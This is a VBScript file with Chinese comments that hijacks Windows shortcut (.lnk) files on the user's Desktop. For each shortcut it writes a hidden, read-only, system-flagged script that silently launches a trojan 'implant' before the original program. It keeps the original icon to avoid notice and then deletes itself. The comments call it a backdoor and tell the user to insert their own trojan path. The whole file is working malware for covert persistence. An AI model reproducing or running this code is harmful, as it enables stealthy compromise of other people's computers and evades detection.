set WshShell = WScript.CreateObject("WScript.Shell" )
Set fso = CreateObject("Scripting.FileSystemObject")

Const FILE_ATTRIBUTE_NORMAL = 0
Const FILE_ATTRIBUTE_READONLY = 1
Const FILE_ATTRIBUTE_HIDDEN = 2
Const FILE_ATTRIBUTE_SYSTEM = 4
Const FILE_ATTRIBUTE_DIRECTORY = 16

Const FILENAME_MIN_LENGTH = 1
Const FILENAME_MAX_LENGTH = 12

Const lnkSuffix = "lnk"
Const hookScriptSuffix = "vbs"

' GetFileSuffixByIndex 
' 根据文件路径和索引，获取对应的后缀
Function GetFileSuffixByIndex(filePath, suffix_index)
	Set file = fso.GetFile(filePath)
	fileName = file.Name
	
	suffix_arr = Split(filename, ".") 
	result = ""
	
    If UBound(suffix_arr) >= suffix_index Then
        result = suffix_arr(UBound(suffix_arr) - suffix_index + 1)
    End If
	
	Set file = Nothing
	GetFileSuffixByIndex = result
End Function

' IsFileSuffixExpected 
' 判断文件后缀是否是预期的文件后缀
Function IsFileSuffixExpected(fileSuffix, expectedSuffix)
	If LCase(fileSuffix)= LCase(expectedSuffix) Then
		IsFileSuffixExpected = 1
	Else
		IsFileSuffixExpected = 0
	End If
End Function

' GetRandomBetween
' 生成一个 [a, b) 区间内的随机数
Function GetRandomBetween(a, b)
    Dim seed
    Randomize Timer
	
    Dim randomValue
	' Rnd 生成一个 [0, 1) 区间内的随机数
    randomValue = Int(((b - a) * Rnd) + a)
    GetRandomBetween = randomValue
End Function

' GetRandomAlphanumeric
' 生成一个字符数字集的随机数
Function GetRandomAlphanumeric()
    Dim charSet, randomChar, randomIndex
    charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    randomIndex = GetRandomBetween(1, Len(charSet) + 1)
    randomChar = Mid(charSet, randomIndex, 1)
    GetRandomAlphanumeric = randomChar
End Function

' GetRandomFileName
' 生成一个随机的文件名
Function GetRandomFileName()
	result = ""
	result_length = GetRandomBetween(FILENAME_MIN_LENGTH, FILENAME_MAX_LENGTH + 1)
	For i = 1 to result_length
		result = result & GetRandomAlphanumeric()
	next
	GetRandomFileName = result
End Function

' IsEndWithBackSlash
' 判断当前文件夹是否是以标准的分隔符"\"结尾
Function IsEndWithBackSlash(path)
	Dim stringLength
	stringLength = Len(path)
	if stringLength <= 1 Then
		IsEndWithBackSlash = 0
	Else
		lastChar = Mid(path, stringLength, 1)
		if lastChar = "\" Then
			IsEndWithBackSlash = 1
		Else 
			IsEndWithBackSlash = 0
		End if
	End if
End Function

' GetStandardFolderName
' 获取以标准的分隔符"\"结尾的文件夹名称
Function GetStandardFolderName(path)
	if IsEndWithBackSlash(path) = 1 Then	
		GetStandardFolderName = path
	Else
		GetStandardFolderName = path & "\"
	End if 
End Function

' TraverseFolder
' 遍历当前文件夹中的文件/子文件夹
Function TraverseFolder(folder)
    Dim subfolder
	On Error Resume Next
	' 遍历当前文件夹中的文件
	For Each file In folder.Files
		If Err.Number = 0 And file.Size > 0 Then
			access_file = file.Path
			If IsFileSuffixExpected(GetFileSuffixByIndex(file, 1), lnkSuffix) = 1 Then
				call HookLnk(access_file, folder)
			End If
		end if
	Next
		
	' 遍历当前文件夹中的子文件夹
	For Each subfolder In folder.SubFolders
		TraverseFolder subfolder ' 递归调用遍历子文件夹
	Next
	
	TraverseFolder = 1
End Function

Function HookLnk(filename, folder)
	HasBeenHacked = 0
	tmp_filename = GetRandomFileName()
	newTarget = GetStandardFolderName(folder) & tmp_filename & "." & hookScriptSuffix
	
	set oShellLink = WshShell.CreateShortcut(filename)
	If fso.FileExists(oShellLink) Then
		' 判断快捷方式是否已经被劫持
		origTarget = oShellLink.TargetPath
		HasBeenHacked = IsFileSuffixExpected(GetFileSuffixByIndex(origTarget, 1), hookScriptSuffix)

		origArgs = oShellLink.Arguments
		'origIcon = oShellLink.IconLocation
		origIcon = origTarget 
		origDir = oShellLink.WorkingDirectory
		
		' 创建后门中间文件(满足条件: 后门不存在 且 Link 尚未被劫持)
		If fso.FileExists(newTarget) Then
			oShellLink.TargetPath = newTarget
		Else
			If HasBeenHacked = 0 Then
				' 设置hook脚本不可见
				Set File = FSO.CreateTextFile(newTarget,True)
				special_file_split = """"""
				File.Write "Set oShell = WScript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
				File.Write "oShell.Run " & special_file_split & chr(34) & implant & chr(34) & special_file_split & vbCrLf
				File.Write "oShell.Run " & special_file_split & chr(34) & origTarget & " " & origArgs & chr(34) & special_file_split & vbCrLf
				File.Close
				
				oShellLink.TargetPath = newTarget
				
				Set SetFileObject = FSO.GetFile(newTarget)
				SetFileObject.Attributes = FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_READONLY
				Set SetFileObject = Nothing
			End If
		End If
	
		' 如果文件并没有被Hook，那么重定向快捷方式指向路径
		If HasBeenHacked = 0 Then
			oShellLink.IconLocation = origTarget & ", 0"
		End If
		oShellLink.WorkingDirectory = origDir
		oShellLink.WindowStyle = 7
		oShellLink.Save
		
		HookLnk = 1
	End If
	HookLnk = 0
End Function

On Error Resume Next
scriptPath = WScript.ScriptFullName

' implant需要修改成自己的木马路径
implant = "C:\Users\Administrator\Desktop\test.exe"
' curUserDesktop 需要修改成需要修改lnk的文件夹
curUser = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")
curUserDesktop = GetStandardFolderName(curUser & "\Desktop")
call TraverseFolder(fso.GetFolder(curUserDesktop))

' 删除当前脚本
If fso.FileExists(scriptPath) Then
	fso.DeleteFile scriptPath, True
End If

Set fso = Nothing
set WshShell = Nothing

